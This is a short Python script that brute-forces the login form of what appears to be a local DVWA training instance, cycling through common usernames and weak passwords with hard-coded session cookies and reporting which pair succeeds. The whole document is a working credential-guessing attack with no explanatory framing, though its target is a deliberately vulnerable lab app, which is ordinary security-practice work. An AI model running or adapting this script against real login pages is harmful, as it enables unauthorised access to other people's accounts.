import requests
cookies = {"connect.sid": "s%3A_FmOs4BBINkGY2u7Jp8zyNbW3-a7sx_j.ycuA0k793w%2FvE5BelygXaRnjRmNOYKA0deV%2Bx7nZ720", "PHPSESSID": "3455ed933f92afb1861be7df535fbfd0", "security": "low"}
url = "http://127.0.0.1:4280/vulnerabilities/brute/"
usernames = ["user", "test", "guest", "admin"]
passwords = ["123456", "password", "admin", "qwerty", "letmein"]
for username in usernames:
    for password in passwords:
        params = {"username": username, "password": password, "Login": "Login"}
        try:
            response = requests.get(url, params=params, headers={"User-Agent": "Mozilla/5.0"}, cookies=cookies)
            if "Welcome to the password protected area admin" in response.text:
                print(f"success : {username}:{password}")
                exit(0)
            else:
                print(f"fail :{username}:{password}")
        except Exception as e:
            print(f"error: {e}")
print("Brute-force ended.")